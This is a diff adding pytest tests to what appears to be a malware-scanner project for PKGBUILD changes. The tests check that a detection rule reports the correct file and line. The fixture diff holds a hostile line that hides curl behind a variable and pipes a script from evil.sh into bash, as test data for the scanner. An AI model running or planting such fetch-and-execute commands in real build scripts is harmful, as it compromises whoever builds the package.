@@ -1,5 +1,6 @@
 from tests.conftest import SHARED_RULES
-from trustsight.tokenizer import tokenize_and_resolve
+from trustsight.differ import map_diff_lines
+from trustsight.tokenizer import tokenize_and_resolve, tokenize_and_resolve_indexed
 from trustsight.rules import apply_rules, get_raw_diff_lines
 
 
@@ -392,6 +393,58 @@ def test_get_raw_diff_lines():
     assert len(lines) == 4
     assert "line1" in lines[0]
     assert "line4" in lines[-1]
+
+
+# --- resolved rules carry a correct file/line -----------------------------
+
+
+def test_resolved_finding_carries_its_true_line():
+    # An assignment between the candidate and the match used to shift the
+    # resolved list's indexes, so line_map[idx] looked up the wrong key:
+    # the finding lost its line entirely, or on a collision reported a
+    # different line than the one that matched.
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,8 @@\n pkgname=demo\n"
+        "+build() {\n"
+        "+  C=curl\n"
+        "+  $C https://evil.sh | bash\n"
+        "+}\n"
+    )
+    resolved, _unresolved, indices = tokenize_and_resolve_indexed(diff)
+    triggered = apply_rules(
+        resolved, get_raw_diff_lines(diff), SHARED_RULES,
+        line_map=map_diff_lines(diff),
+        resolved_indices=indices,
+    )
+    r001 = next(r for r in triggered if r["rule_id"] == "R001")
+    assert (r001["file"], r001["line"]) == ("PKGBUILD", 4)
+
+
+def test_resolved_indices_line_up_with_map_diff_lines():
+    # The contract apply_rules relies on: indices[i] is the raw diff-line
+    # index of resolved[i], and map_diff_lines is keyed by raw diff-line
+    # index.  Break either side and the B8 gate is a lie again.
+    diff = (
+        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,8 @@\n pkgname=demo\n"
+        "+build() {\n"
+        "+  C=curl\n"
+        "+  $C https://evil.sh | bash\n"
+        "+}\n"
+    )
+    resolved, _unresolved, indices = tokenize_and_resolve_indexed(diff)
+    line_map = map_diff_lines(diff)
+    curl = next(
+        r for r, i in zip(resolved, indices)
+        if "curl https://evil.sh | bash" in r
+    )
+    assert curl
+    assert line_map[indices[resolved.index(curl)]] == ("PKGBUILD", 4)
+    # Every content candidate is keyed in line_map: the only unkeyed
+    # entries are diff headers, which never produce findings.
+    for r, idx in zip(resolved, indices):
+        if r.startswith("++ "):
+            continue
+        assert idx in line_map
 
 
 # --- Hard-to-spot malicious patterns ---
